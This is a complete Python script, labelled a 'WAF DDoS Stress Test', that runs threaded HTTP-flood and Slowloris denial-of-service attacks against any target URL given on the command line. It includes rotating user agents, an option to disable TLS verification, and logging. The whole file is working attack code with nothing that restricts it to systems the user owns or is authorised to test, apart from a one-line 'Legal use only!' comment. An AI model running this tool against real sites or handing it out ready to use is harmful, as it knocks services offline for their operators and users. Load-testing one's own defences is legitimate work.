#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WAF DDoS Stress Test
HTTP Flood + Slowloris
Legal use only!
"""

import socket
import threading
import random
import time
import urllib.parse
import logging
import os
import ssl
import argparse
from datetime import datetime
from contextlib import suppress

TARGET_URL = ""
THREAD_COUNT = 0
REQUESTS_PER_THREAD = 0
INSECURE_TLS = False
LOG_BASENAME = "waf_stress_test"
LOGGER = None

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
]

# -------------------------
# LOGGING SETUP
# -------------------------
def _setup_logging(log_dir):
    os.makedirs(log_dir, exist_ok=True)
    timestamp = datetime.utcnow().strftime("%Y%m%dT%H%M%SZ")
    logfile = os.path.join(log_dir, f"{LOG_BASENAME}_{timestamp}.log")

    logger = logging.getLogger("waf_stress")
    logger.setLevel(logging.INFO)
    logger.handlers.clear()

    fmt = logging.Formatter("%(asctime)sZ\t%(levelname)s\t%(threadName)s\t%(message)s", "%Y-%m-%dT%H:%M:%S")
    fh = logging.FileHandler(logfile, encoding="utf-8")
    fh.setFormatter(fmt)
    sh = logging.StreamHandler()
    sh.setFormatter(fmt)

    logger.addHandler(fh)
    logger.addHandler(sh)
    logger.propagate = False
    logger.info(f"log_file={logfile}")
    return logger

# -------------------------
# URL PARSER
# -------------------------
def parse_url(url: str):
    parsed = urllib.parse.urlparse(url)
    host = parsed.hostname
    scheme = parsed.scheme or "http"
    port = parsed.port if parsed.port else (443 if scheme == "https" else 80)
    path = parsed.path if parsed.path else "/"
    return host, port, path, scheme

# -------------------------
# CONNECTION HANDLER
# -------------------------
def _connect(host: str, port: int, scheme: str) -> socket.socket:
    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw.settimeout(4)
    raw.connect((host, port))
    if scheme == "https":
        if INSECURE_TLS:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        else:
            ctx = ssl.create_default_context()
        return ctx.wrap_socket(raw, server_hostname=host)
    return raw

# -------------------------
# RECEIVE STATUS LINE
# -------------------------
def _recv_status_line(sock: socket.socket) -> str:
    with suppress(Exception):
        sock.settimeout(2)
        data = b""
        while b"\r\n" not in data and len(data) < 4096:
            chunk = sock.recv(256)
            if not chunk:
                break
            data += chunk
        line = data.split(b"\r\n", 1)[0]
        return line.decode(errors="replace")
    return ""

# -------------------------
# ATTACK METHODS
# -------------------------
def http_flood():
    host, port, path, scheme = parse_url(TARGET_URL)
    for i in range(REQUESTS_PER_THREAD):
        s = None
        try:
            s = _connect(host, port, scheme)
            ua = random.choice(USER_AGENTS)
            req = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Connection: close\r\n\r\n"
            ).encode()
            with suppress(OSError):
                s.sendall(req)

            status = _recv_status_line(s)
            if status:
                LOGGER.info(f"http_flood status host={host} port={port} scheme={scheme} i={i} status_line='{status}'")
            else:
                LOGGER.info(f"http_flood sent no_status host={host} port={port} scheme={scheme} i={i}")
            time.sleep(random.uniform(0.1, 0.5))
        except (socket.timeout, OSError, ssl.SSLError) as e:
            LOGGER.warning(f"http_flood exception type={type(e).__name__} host={host} port={port} scheme={scheme} i={i}: {e}")
        finally:
            if s:
                with suppress(OSError):
                    s.close()

def slowloris():
    host, port, path, scheme = parse_url(TARGET_URL)
    sockets = []
    for i in range(REQUESTS_PER_THREAD):
        s = None
        try:
            s = _connect(host, port, scheme)
            head = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"Connection: keep-alive\r\n"
            ).encode()
            with suppress(OSError):
                s.sendall(head)
            sockets.append(s)
            LOGGER.info(f"slowloris opened host={host} port={port} scheme={scheme} i={i}")
            time.sleep(0.1)
        except (socket.timeout, OSError, ssl.SSLError) as e:
            LOGGER.warning(f"slowloris exception type={type(e).__name__} host={host} port={port} scheme={scheme} i={i}: {e}")
            if s:
                with suppress(Exception):
                    s.close()

    for idx, s in enumerate(sockets):
        with suppress(OSError):
            s.send(b"X-a: b\r\n")
        LOGGER.info(f"slowloris keepalive sent idx={idx} total={len(sockets)}")
        time.sleep(10)

    for idx, s in enumerate(sockets):
        with suppress(Exception):
            s.close()
        LOGGER.info(f"slowloris closed idx={idx}")

# -------------------------
# MAIN
# -------------------------
def main():
    global TARGET_URL, THREAD_COUNT, REQUESTS_PER_THREAD, INSECURE_TLS, LOGGER

    parser = argparse.ArgumentParser(description="WAF DDoS Stress Test Tool")
    parser.add_argument("--target", required=True, help="Target URL (e.g., https://example.com)")
    parser.add_argument("--threads", type=int, default=100, help="Number of threads")
    parser.add_argument("--rpt", type=int, default=100, help="Requests per thread")
    parser.add_argument("--logdir", default="./logs", help="Log directory")
    parser.add_argument("--insecure-tls", action="store_true", help="Disable TLS certificate verification")
    args = parser.parse_args()

    TARGET_URL = args.target
    THREAD_COUNT = args.threads
    REQUESTS_PER_THREAD = args.rpt
    INSECURE_TLS = args.insecure_tls
    LOGGER = _setup_logging(args.logdir)

    LOGGER.info(f"start target={TARGET_URL} threads={THREAD_COUNT} per_thread={REQUESTS_PER_THREAD}")

    threads = []
    for n in range(THREAD_COUNT):
        attack_type = random.choice([http_flood, slowloris])
        t = threading.Thread(target=attack_type, daemon=True, name=f"atk-{n}")
        threads.append(t)
        t.start()
        LOGGER.info(f"thread started name={t.name} type={attack_type.__name__}")

    for t in threads:
        t.join()

    LOGGER.info("done")

if __name__ == "__main__":
    main()
